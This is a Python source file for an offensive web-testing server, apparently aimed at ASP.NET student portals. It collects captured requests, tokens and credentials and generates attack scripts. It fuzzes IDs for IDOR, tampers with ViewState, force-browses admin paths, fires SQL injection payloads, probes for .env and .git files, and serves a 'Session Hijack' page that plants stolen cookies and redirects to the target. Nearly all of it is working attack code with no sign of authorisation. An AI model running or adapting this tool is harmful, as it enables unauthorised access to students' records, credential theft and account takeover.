            "        test_val = str(max(1, base_n + delta))",
            "        if test_val == orig_val:",
            "            continue",
            "        p = dict(BASE_PARAMS); p[param] = test_val",
            "        r = session.get(TARGET, params=p, timeout=10)",
            "        diff = abs(len(r.text) - baseline_size) / max(baseline_size, 1)",
            "        vuln = r.status_code == 200 and len(r.text) > 200",
            "        flag = '[VULN]' if vuln else '[    ]'",
            "        print(f'{flag} {param}={test_val} -> HTTP {r.status_code} | {len(r.text)}B | diff={round(diff*100)}%')",
            "        if vuln:",
            "            findings.append({'param': param, 'value': test_val, 'status': r.status_code, 'size': len(r.text)})",
            "",
            "print(f'\\n[=] Findings: {len(findings)}')",
            "print(json.dumps(findings, indent=2, ensure_ascii=False))",
        ]
    return "\n".join(lines) + "\n"


class SnifferRequestHandler(BaseHTTPRequestHandler):
    hub: SnifferHub

    def _send_cors_headers(self) -> None:
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")

    def do_OPTIONS(self) -> None:
        self.send_response(204)
        self._send_cors_headers()
        self.end_headers()

    def _send_json(self, status: int, data: Any) -> None:
        body = json.dumps(data, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self._send_cors_headers()
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query)

        if path == "/":
            body = DASHBOARD_HTML.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        if path == "/api/status":
            self._send_json(200, self.hub.get_status())
        elif path == "/api/feed":
            filter_kw = qs.get("filter", [""])[0]
            limit = int(qs.get("limit", [100])[0])
            source = qs.get("source", [""])[0]
            items = self.hub.get_feed(filter_kw=filter_kw, limit=limit, source=source)
            self._send_json(200, {"ok": True, "requests": items})
        elif path.startswith("/api/request/"):
            req_id = path.replace("/api/request/", "").strip()
            item = self.hub.get_by_id(req_id)
            if item:
                self._send_json(200, item.to_dict())
            else:
                self._send_json(404, {"error": "Request not found"})
        elif path.startswith("/api/codegen/"):
            req_id = path.replace("/api/codegen/", "").strip()
            item = self.hub.get_by_id(req_id)
            if item:
                py_code = generate_python_script(item)
                curl_cmd = generate_curl_command(item)
                self._send_json(200, {"ok": True, "python": py_code, "curl": curl_cmd})
            else:
                self._send_json(404, {"error": "Request not found"})
        elif path == "/api/tokens":
            self._send_json(200, {"ok": True, "tokens": self.hub.get_aggregated_tokens()})
        elif path.startswith("/api/scan/script/"):
            req_id = path.replace("/api/scan/script/", "").strip()
            scan_type = qs.get("scan_type", ["idor"])[0]
            item = self.hub.get_by_id(req_id)
            if not item:
                self._send_json(404, {"error": "Request not found"})
                return
            from .models import detect_idor_params as _dip
            idor_params = _dip(item.url, item.body)
            cookie_hdr = item.headers.get("cookie") or item.headers.get("Cookie", "")
            script = _build_scan_script(item.url, cookie_hdr, idor_params, scan_type)
            script_bytes = script.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/x-python; charset=utf-8")
            self.send_header("Content-Disposition", f'attachment; filename="scan_{scan_type}_{req_id}.py"')
            self.send_header("Content-Length", str(len(script_bytes)))
            self._send_cors_headers()
            self.end_headers()
            self.wfile.write(script_bytes)
        elif path == "/api/report":
            scan_data = getattr(self.hub, '_last_scan', None)
            aggregated = self.hub.get_aggregated_tokens()
            important_reqs = [r.to_dict() for r in self.hub.queue if r.is_important][:20]
            self._send_json(200, {
                "ok": True,
                "generated_at": time.time(),
                "total_captured": len(self.hub.queue),
                "important_requests": important_reqs,
                "aggregated_tokens": aggregated,
                "last_scan": scan_data
            })
        elif path == "/api/credentials":
            self._send_json(200, {"ok": True, "credentials": self.hub.credentials})
        elif path.startswith("/api/hijack"):
            # Serve a page that sets cookies and redirects
            target_url = qs.get("url", [""])[0]
            cookies_json = qs.get("cookies", ["[]"])[0]
            try:
                cookies = json.loads(cookies_json)
            except Exception:
                cookies = []
            hijack_html = self._build_hijack_page(target_url, cookies)
            body_bytes = hijack_html.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body_bytes)))
            self.end_headers()
            self.wfile.write(body_bytes)
        else:
            self._send_json(404, {"error": "Endpoint not found"})

    def do_POST(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b"{}"

        try:
            payload = json.loads(body.decode("utf-8"))
        except Exception:
            payload = {}

        if path == "/api/ingest":
            if isinstance(payload, list):
                ingested = []
                for item in payload:
                    if isinstance(item, dict):
                        r = self.hub.ingest(item)
                        if r:
                            ingested.append(r.to_dict())
                self._send_json(200, {"ok": True, "ingested_count": len(ingested)})
            elif isinstance(payload, dict):
                req = self.hub.ingest(payload)
                self._send_json(200, {"ok": True, "request": req.to_dict() if req else None})
            else:
                self._send_json(400, {"error": "Invalid JSON format"})
        elif path == "/api/scan/idor":
            self._handle_scan(payload)
            return
        elif path == "/api/probe":
            self._handle_probe(payload)
            return
        elif path == "/api/replay":
            self._handle_replay(payload)
            return
        elif path == "/api/clear":
            self.hub.clear()
            self.hub.credentials.clear()
            self._send_json(200, {"ok": True, "message": "Cleared"})
        else:
            self._send_json(404, {"error": "Endpoint not found"})

    def _handle_scan(self, payload: dict) -> None:
        import urllib.request as _ur
        import urllib.parse as _up
        import ssl
        import re as _re
        req_id = payload.get("req_id", "")
        scan_type = payload.get("scan_type", "idor")
        depth = int(payload.get("depth", 10))
        item = self.hub.get_by_id(req_id)
        if not item:
            self._send_json(404, {"error": "Request not found"})
            return

        from .models import detect_idor_params
        idor_params = detect_idor_params(item.url, item.body)
        cookie_header = item.headers.get("cookie") or item.headers.get("Cookie", "")
        parsed_url = _up.urlparse(item.url)
        base_params = dict(_up.parse_qsl(parsed_url.query))

        _LOGIN_MARKERS = _re.compile(
            r'(login\.aspx|dangnhap|txtusername|txtpassword|btnlogin|'
            r'<input[^>]*type=["\'"]password|window\.location.*login|'
            r'returnurl=|response\.redirect.*login)',
            _re.IGNORECASE
        )

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        def _do_request(url, cookies_str=None):
            req_obj = _ur.Request(url)
            if cookies_str:
                req_obj.add_header("Cookie", cookies_str)
            req_obj.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            req_obj.add_header("Accept", "text/html,application/json,*/*")
            try:
                with _ur.urlopen(req_obj, timeout=8, context=ctx) as resp:
                    status = resp.status
                    final_url = resp.url
                    rbody = resp.read(8192).decode("utf-8", errors="replace")
                    return status, rbody, final_url
            except _ur.HTTPError as e:
                return e.code, "", ""
            except Exception as ex:
                return 0, str(ex)[:200], ""

        baseline_status, baseline_body, baseline_final_url = _do_request(item.url, cookie_header)
        baseline_size = len(baseline_body)
        results = []

        if scan_type == "session_swap":
            import random, string
            aspxauth = ""
            session_id_name = ""
            for part in cookie_header.split(";"):
                part = part.strip()
                if part.lower().startswith(".aspxauth="):
                    aspxauth = part.split("=", 1)[1]
                elif part.lower().startswith("asp.net_sessionid="):
                    session_id_name = part.split("=", 1)[0]

            if not aspxauth:
                self._send_json(200, {
                    "ok": True, "url": item.url, "req_id": req_id,
                    "scan_type": scan_type, "idor_params": {},
                    "baseline_size": baseline_size, "results": [],
                    "baseline_body": baseline_body[:1500],
                    "note": "No .ASPXAUTH cookie found."
                })
                return

            idor_params = {"_session_swap": "random"}
            for i in range(min(depth, 5)):
                fake_session = ''.join(random.choices(string.ascii_lowercase + string.digits, k=24))
                swapped_cookie = f"{session_id_name or 'ASP.NET_SessionId'}={fake_session}; .ASPXAUTH={aspxauth}"
                status, rbody, final_url = _do_request(item.url, swapped_cookie)
                rsize = len(rbody)
                is_login = bool(_LOGIN_MARKERS.search(rbody[:3000]))
                is_vuln = status == 200 and rsize > 200 and not is_login
                if is_login:
                    note = "Login redirect detected - server validates session"
                elif status == 200 and rsize > 200:
                    diff_ratio = abs(rsize - baseline_size) / max(baseline_size, 1)
                    note = f"200 OK ({rsize}B, diff {round(diff_ratio*100)}%) - POSSIBLE SESSION FIXATION"
                elif status in (301, 302, 303):
                    note = "Redirect - server rejects fake session"
                else:
                    note = f"HTTP {status}"
                results.append({
                    "param": "_session_swap", "value": fake_session[:12] + "...",
                    "status": status, "size": rsize,
                    "vuln": is_vuln, "note": note,
                    "response_snippet": rbody[:1000]
                })

        elif scan_type == "bfla":
            idor_params = {"_no_auth": "1"}
            status, rbody, final_url = _do_request(item.url, None)
            rsize = len(rbody)
            is_login = bool(_LOGIN_MARKERS.search(rbody[:3000]))
            redirected = final_url and "login" in final_url.lower()

            if is_login or redirected:
                is_vuln = False
                note = f"FALSE POSITIVE - Response is login page ({rsize}B). Server correctly requires auth."
            elif status == 200 and rsize > 200:
                diff_ratio = abs(rsize - baseline_size) / max(baseline_size, 1)
                if diff_ratio < 0.30:
                    is_vuln = True
                    note = f"BFLA CONFIRMED - anonymous gets same content ({rsize}B, diff {round(diff_ratio*100)}%)"
                else:
                    is_vuln = True
                    note = f"Possible BFLA - anonymous gets content ({rsize}B, diff {round(diff_ratio*100)}%)"
            elif status in (301, 302, 303):
                is_vuln = False
                note = "Redirect (likely to login) - server checks auth"
            elif status in (401, 403):
                is_vuln = False
                note = f"Access Denied ({status}) - server correctly blocks anonymous"
            else:
                is_vuln = False
                note = f"HTTP {status}"

            results.append({
                "param": "_no_auth", "value": "anonymous",
                "status": status, "size": rsize,
                "vuln": is_vuln, "note": note,
                "response_snippet": rbody[:1000]
            })

        else:
            if not idor_params:
                self._send_json(200, {
                    "ok": True, "url": item.url, "req_id": req_id,
                    "idor_params": {}, "results": [],
                    "baseline_size": baseline_size,
                    "baseline_body": baseline_body[:1500],
                    "note": "No fuzzable ID parameters found."
                })
                return

            for param_name, orig_val in list(idor_params.items())[:3]:
                if not orig_val.isdigit():
                    continue
                base_n = int(orig_val)
                fuzz_values = [str(max(1, base_n + d)) for d in range(-2, depth - 2)]
                if str(base_n) in fuzz_values:
                    fuzz_values.remove(str(base_n))

                for fval in fuzz_values[:depth]:
                    test_params = dict(base_params)
                    test_params[param_name] = fval
                    new_qs = _up.urlencode(test_params)
                    test_url = _up.urlunparse(parsed_url._replace(query=new_qs))
                    status, rbody, final_url = _do_request(test_url, cookie_header)
                    rsize = len(rbody)
                    is_login = bool(_LOGIN_MARKERS.search(rbody[:3000]))

                    if is_login:
                        is_vuln = False
                        note = "Login page - not IDOR"
                    elif status == 200 and rsize > 200:
                        diff_ratio = abs(rsize - baseline_size) / max(baseline_size, 1)
                        if diff_ratio < 0.20:
                            is_vuln = True
                            note = f"Same-size response ({rsize}B) - likely IDOR"
                        else:
                            is_vuln = True
                            note = f"Size diff {round(diff_ratio*100)}% - review manually"
                    elif status in (301, 302, 303):
                        is_vuln = False
                        note = "Redirect"
                    elif status in (401, 403):
                        is_vuln = False
                        note = f"Access Denied ({status})"
                    else:
                        is_vuln = False
                        note = f"HTTP {status}"

                    results.append({
                        "param": param_name, "value": fval,
                        "status": status, "size": rsize,
                        "vuln": is_vuln, "note": note,
                        "response_snippet": rbody[:1000]
                    })

        self.hub._last_scan = {
            "url": item.url, "req_id": req_id, "scan_type": scan_type,
            "idor_params": idor_params, "baseline_size": baseline_size,
            "results": results, "timestamp": time.time()
        }

        self._send_json(200, {
            "ok": True, "url": item.url, "req_id": req_id,
            "scan_type": scan_type,
            "idor_params": idor_params,
            "baseline_size": baseline_size,
            "baseline_body": baseline_body[:1500],
            "results": results
        })

    def _handle_probe(self, payload: dict) -> None:
        import urllib.request as _ur
        import urllib.parse as _up
        import ssl
        import re as _re

        req_id = payload.get("req_id", "")
        probe_type = payload.get("probe_type", "all")
        item = self.hub.get_by_id(req_id)
        if not item:
            self._send_json(404, {"error": "Request not found"})
            return

        cookie_header = item.headers.get("cookie") or item.headers.get("Cookie", "")
        parsed = _up.urlparse(item.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        findings = []

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        _LOGIN_MARKERS = _re.compile(
            r'(login\.aspx|dangnhap|txtusername|txtpassword|btnlogin|'
            r'<input[^>]*type=["\'"]password|returnurl=)',
            _re.IGNORECASE
        )

        def _req(url, cookies=None, method="GET", body_data=None):
            try:
                req_obj = _ur.Request(url, data=body_data, method=method)
                if cookies:
                    req_obj.add_header("Cookie", cookies)
                req_obj.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                req_obj.add_header("Accept", "text/html,application/json,*/*")
                with _ur.urlopen(req_obj, timeout=8, context=ctx) as resp:
                    body = resp.read(8192).decode("utf-8", errors="replace")
                    return resp.status, body, resp.url
            except _ur.HTTPError as e:
                return e.code, "", ""
            except Exception:
                return 0, "", ""

        # Get baseline
        base_status, base_body, base_final = _req(item.url, cookie_header)
        base_size = len(base_body)
        is_base_login = bool(_LOGIN_MARKERS.search(base_body[:3000]))

        # === IDOR PROBE (POST body + ViewState + AJAX) ===
        if probe_type in ("all", "idor"):
            import base64 as _b64

            # 1. Check if this is a POST request with body (form data / IDOR in body)
            body_str = item.body or ""
            post_params = dict(_up.parse_qsl(body_str)) if body_str else {}
            
            # Find numeric/student-ID-like fields in POST body
            id_fields = {}
            for k, v in post_params.items():
                kl = k.lower()
                if any(x in kl for x in ("masv", "studentid", "ma_sv", "mssv", "id", "student")):
                    if v and len(v) < 20:
                        id_fields[k] = v
                elif v.isdigit() and len(v) <= 10:
                    id_fields[k] = v

            if id_fields:
                for field, orig_val in list(id_fields.items())[:3]:
                    test_vals = []
                    if orig_val.isdigit():
                        base_n = int(orig_val)
                        test_vals = [str(max(1, base_n + d)) for d in [-1, 1, -5, 5, -10, 10]]
                    else:
                        test_vals = ["20210001", "20210002", "2021001"]

                    for tval in test_vals[:5]:
                        test_body_params = dict(post_params)
                        test_body_params[field] = tval
                        new_body = _up.urlencode(test_body_params).encode("utf-8")
                        req_obj = _ur.Request(item.url, data=new_body, method="POST")
                        if cookie_header:
                            req_obj.add_header("Cookie", cookie_header)
                        ct = item.headers.get("content-type") or item.headers.get("Content-Type", "application/x-www-form-urlencoded")
                        req_obj.add_header("Content-Type", ct)
                        req_obj.add_header("User-Agent", "Mozilla/5.0")
                        try:
                            with _ur.urlopen(req_obj, timeout=10, context=ctx) as resp:
                                status = resp.status
                                body = resp.read(8192).decode("utf-8", errors="replace")
                        except _ur.HTTPError as e:
                            status = e.code
                            body = ""
                        except Exception:
                            continue
                        rsize = len(body)
                        diff = abs(rsize - base_size) / max(base_size, 1)
                        is_login = bool(_LOGIN_MARKERS.search(body[:3000]))
                        if status == 200 and rsize > 200 and not is_login and diff < 0.15:
                            # Check if content actually changed (different name/data)
                            findings.append({
                                "type": "IDOR_POST", "severity": "HIGH",
                                "title": f"IDOR POST: field '{field}'={tval} (HTTP 200, {rsize}B, diff {round(diff*100)}%)",
                                "detail": f"POST body field '{field}' thay thanh '{tval}' → server tra HTTP 200 size tuong duong. Kiem tra response co data SV khac.",
                                "evidence": body[:400]
                            })
            elif item.method == "GET":
                findings.append({
                    "type": "IDOR", "severity": "INFO",
                    "title": "ASP.NET Session-based: URL param bi ignore",
                    "detail": "Server dung Session de xac dinh SV, khong doc URL param. IDOR can test qua POST body hoac AJAX endpoints. Xem huong dan: tim POST request co hidden field MaSV."
                })

            # 2. ViewState MAC validation check
            if "__VIEWSTATE" in post_params:
                vs = post_params["__VIEWSTATE"]
                try:
                    decoded = _b64.b64decode(vs + "==")
                    # Try sending request with tampered ViewState (flip last 2 bytes)
                    tampered = list(decoded)
                    if len(tampered) > 4:
                        tampered[-1] ^= 0xFF
                        tampered[-2] ^= 0xFF
                    tampered_b64 = _b64.b64encode(bytes(tampered)).decode()
                    test_params_vs = dict(post_params)
                    test_params_vs["__VIEWSTATE"] = tampered_b64
                    new_body = _up.urlencode(test_params_vs).encode("utf-8")
                    req_obj_vs = _ur.Request(item.url, data=new_body, method="POST")
                    if cookie_header:
                        req_obj_vs.add_header("Cookie", cookie_header)
                    req_obj_vs.add_header("User-Agent", "Mozilla/5.0")
                    req_obj_vs.add_header("Content-Type", "application/x-www-form-urlencoded")
                    try:
                        with _ur.urlopen(req_obj_vs, timeout=10, context=ctx) as resp:
                            vs_status = resp.status
                            vs_body = resp.read(4096).decode("utf-8", errors="replace")
                        if vs_status == 200 and "error" not in vs_body.lower() and "invalid" not in vs_body.lower():
                            findings.append({
                                "type": "VIEWSTATE_MAC", "severity": "HIGH",
                                "title": "ViewState MAC validation DISABLED - co the tamper",
                                "detail": "Server chap nhan ViewState bi sua doi ma khong bao loi. Co the tamper ViewState de bypass validation.",
                                "evidence": vs_body[:200]
                            })
                        else:
                            findings.append({
                                "type": "VIEWSTATE_MAC", "severity": "INFO",
                                "title": "ViewState MAC validation: ON (server reject tampered VS)",
                                "detail": f"HTTP {vs_status} - server tu choi ViewState bi sua. MAC validation hoat dong."
                            })
                    except Exception:
                        pass
                except Exception:
                    pass

            # 3. Discover AJAX/WebService endpoints
            ajax_paths = [
                "/WebService.asmx", "/Service.asmx", "/ajax/",
                "/api/SinhVien", "/api/Student", "/api/KetQua",
                "/Handler.ashx", "/AjaxHandler.ashx",
                "/SinhVienService.asmx", "/DiemService.asmx",
            ]
            for apath in ajax_paths:
                url = base_url + apath
                status, body, final_url = _req(url, cookie_header)
                if status == 200 and len(body) > 50:
                    is_login = bool(_LOGIN_MARKERS.search(body[:2000]))
                    if not is_login:
                        findings.append({
                            "type": "AJAX_ENDPOINT", "severity": "MEDIUM",
                            "title": f"AJAX endpoint kha nghi: {apath} (HTTP 200)",
                            "detail": f"Endpoint {apath} tra ve content ({len(body)}B). Co the la API nhan Student ID.",
                            "evidence": body[:300]
                        })

        # === FORCED BROWSE ===
        if probe_type in ("all", "paths"):
            admin_paths = [
                "/Admin/", "/admin/", "/QuanLy/", "/quanly/",
                "/GiangVien/", "/giangvien/", "/Teacher/",
                "/Manager/", "/api/", "/Dashboard/",
                "/Report/", "/BaoCao/", "/ThongKe/",
                "/SinhVien/QuanLy.aspx", "/NhanVien/",
                "/System/", "/Config/", "/Setup/",
                "/Default.aspx?role=admin", "/Home.aspx?admin=1",
            ]
            for p in admin_paths:
                url = base_url + p
                status, body, final_url = _req(url, cookie_header)
                rsize = len(body)
                is_login = bool(_LOGIN_MARKERS.search(body[:3000]))

                if status == 200 and rsize > 300 and not is_login:
                    findings.append({
                        "type": "FORCED_BROWSE", "severity": "HIGH",
                        "title": f"Truy cap duoc: {p} (HTTP 200, {rsize}B)",
                        "detail": f"Trang {p} tra ve content thuc su. Kiem tra xem co phai trang quan tri.",
                        "evidence": body[:300]
                    })
                elif status == 200 and is_login:
                    findings.append({
                        "type": "FORCED_BROWSE", "severity": "INFO",
                        "title": f"{p} -> redirect login",
                        "detail": "Server bao ve dung - redirect ve trang dang nhap."
                    })
                elif status == 403:
                    findings.append({
                        "type": "FORCED_BROWSE", "severity": "INFO",
                        "title": f"{p} -> 403 Forbidden",
                        "detail": "Path ton tai nhung bi chan quyen truy cap."
                    })

        # === SQL INJECTION ===
        if probe_type in ("all", "sqli"):
            sqli_payloads = [
                ("' OR '1'='1", "basic-or"),
                ("1' OR 1=1--", "comment-bypass"),
                ("1 UNION SELECT NULL--", "union-test"),
                ("'; WAITFOR DELAY '0:0:3'--", "time-based"),
                ("1' AND 1=CONVERT(int,(SELECT @@version))--", "error-based"),
            ]
            params = dict(_up.parse_qsl(parsed.query))
            targets = list(params.keys())
            if not targets:
                targets = ["MaSV", "id"]

            for pname in targets[:3]:
                for sqli_val, sqli_name in sqli_payloads:
                    test_params = dict(params)
                    test_params[pname] = sqli_val
                    test_qs = _up.urlencode(test_params)
                    test_url = _up.urlunparse(parsed._replace(query=test_qs))
                    status, body, final_url = _req(test_url, cookie_header)
                    rsize = len(body)
                    body_lower = body.lower()

                    sql_errors = ["sql", "syntax error", "unclosed quotation", "odbc", "oledb",
                                  "microsoft sql", "mysql", "oracle", "postgresql",
                                  "stack trace", "exception", "server error"]
                    found_error = any(e in body_lower for e in sql_errors)

                    if found_error:
                        findings.append({
                            "type": "SQLI", "severity": "CRITICAL",
                            "title": f"SQL Error voi payload {sqli_name} tren {pname}",
                            "detail": f"Server tra ve SQL error message! Day la dau hieu SQL Injection.",
                            "evidence": body[:400]
                        })
                    elif status == 500:
                        findings.append({
                            "type": "SQLI", "severity": "MEDIUM",
                            "title": f"HTTP 500 voi payload {sqli_name} tren {pname}",
                            "detail": f"Server crash khi nhan SQL payload. Co the vulnerable.",
                            "evidence": body[:200]
                        })

        # === INFO DISCLOSURE ===
        if probe_type in ("all", "info"):
            info_paths = [
                "/web.config", "/Web.config", "/WEB.config",
                "/.env", "/.git/HEAD", "/.git/config",
                "/robots.txt", "/sitemap.xml",
                "/elmah.axd", "/trace.axd",
                "/phpinfo.php", "/server-status",
                "/backup/", "/Backup/", "/db/", "/database/",
                "/test/", "/debug/", "/temp/",
                "/.svn/entries", "/.DS_Store",
            ]
            for p in info_paths:
                url = base_url + p
                status, body, final_url = _req(url, cookie_header)
                rsize = len(body)
                is_login = bool(_LOGIN_MARKERS.search(body[:3000]))

                if status == 200 and rsize > 50 and not is_login:
                    severity = "HIGH"
                    if p in ("/robots.txt", "/sitemap.xml"):
                        severity = "LOW"
                    elif ".git" in p or "web.config" in p.lower() or ".env" in p:
                        severity = "CRITICAL"
                    elif "elmah" in p or "trace" in p:
                        severity = "CRITICAL"

                    findings.append({
                        "type": "INFO_LEAK", "severity": severity,
                        "title": f"File nhay cam truy cap duoc: {p} ({rsize}B)",
                        "detail": f"HTTP 200 voi content thuc su. Co the lo thong tin cau hinh, ma nguon, hoac credentials.",
                        "evidence": body[:400]
                    })

        # Sort by severity
        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        findings.sort(key=lambda f: sev_order.get(f.get("severity", "INFO"), 5))

        self._send_json(200, {
            "ok": True,
            "target": item.url,
            "base_url": base_url,
            "probe_type": probe_type,
            "total_findings": len(findings),
            "findings": findings
        })

    def _handle_replay(self, payload: dict) -> None:
        import urllib.request as _ur
        import ssl
        method = payload.get("method", "GET").upper()
        url = payload.get("url", "")
        headers_raw = payload.get("headers", "{}")
        body = payload.get("body", "")

        if not url:
            self._send_json(400, {"error": "No URL"})
            return

        try:
            headers = json.loads(headers_raw) if isinstance(headers_raw, str) else headers_raw
        except Exception:
            headers = {}

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            body_bytes = body.encode("utf-8") if body and method in ("POST", "PUT", "PATCH") else None
            req_obj = _ur.Request(url, data=body_bytes, method=method)
            for k, v in headers.items():
                if k.lower() not in ("host", "content-length"):
                    req_obj.add_header(k, str(v))
            if not any(k.lower() == "user-agent" for k in headers):
                req_obj.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

            with _ur.urlopen(req_obj, timeout=25, context=ctx) as resp:
                status = resp.status
                resp_body = resp.read(16384).decode("utf-8", errors="replace")
                resp_headers = dict(resp.getheaders())

            self._send_json(200, {
                "ok": True, "status": status,
                "headers": resp_headers,
                "body": resp_body,
                "size": len(resp_body)
            })
        except _ur.HTTPError as e:
            try:
                err_body = e.read(8192).decode("utf-8", errors="replace")
            except Exception:
                err_body = str(e)
            self._send_json(200, {"ok": True, "status": e.code, "body": err_body, "size": 0})
        except Exception as ex:
            self._send_json(200, {"ok": False, "status": 0, "body": str(ex), "size": 0})

    def _build_hijack_page(self, target_url: str, cookies: list) -> str:
        cookie_lines = []
        display_lines = []
        for c in cookies:
            name = c.get("name", "")
            value = c.get("value", "")
            if name and value:
                safe_val = value.replace('"', '\\"').replace("'", "\\'")
                cookie_lines.append(f'document.cookie="{name}={safe_val};path=/";')
                display_lines.append(f"{name}={value[:40]}...")

        return f"""<!DOCTYPE html>
<html><head><title>Session Hijack</title></head>
<body style="background:#090d16;color:#f1f5f9;font-family:monospace;padding:30px">
<h2 style="color:#ef4444">Session Hijack Active</h2>
<p style="color:#facc15">Target: {target_url}</p>
<p style="color:#94a3b8">Injecting {len(cookies)} cookies...</p>
<pre style="background:#0f172a;padding:12px;border-radius:6px;color:#34d399;max-height:200px;overflow:auto">""" + "\n".join(display_lines[:10]) + f"""</pre>
<p style="color:#34d399" id="st">Setting cookies...</p>
<script>
{chr(10).join(cookie_lines)}
document.getElementById('st').textContent='Cookies set. Redirecting...';
setTimeout(function(){{window.location.href="{target_url}";}},1500);
</script></body></html>"""

    def log_message(self, format: str, *args: Any) -> None:
        # Suppress noisy HTTP console logs
        return



def run_sniffer_hub(port: int = 8999, host: str = "127.0.0.1") -> ThreadingHTTPServer:
    hub = SnifferHub()
    handler = SnifferRequestHandler
    handler.hub = hub
    server = ThreadingHTTPServer((host, port), handler)
    print(f"\n{'='*65}")
    print(f"📡 RELAY-KIT UNIFIED API SNIFFER HUB ONLINE")
    print(f"[*] Web Dashboard : http://{host}:{port}")
    print(f"[*] Ingestion API : http://{host}:{port}/api/ingest")
    print(f"[*] Feed API      : http://{host}:{port}/api/feed")
    print(f"{'='*65}\n")
    return server


if __name__ == "__main__":
    port = 8999
    if len(sys.argv) > 1 and sys.argv[1].isdigit():
        port = int(sys.argv[1])
    server = run_sniffer_hub(port=port, host="127.0.0.1")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopping Sniffer Hub...")
        server.shutdown()
        server.server_close()
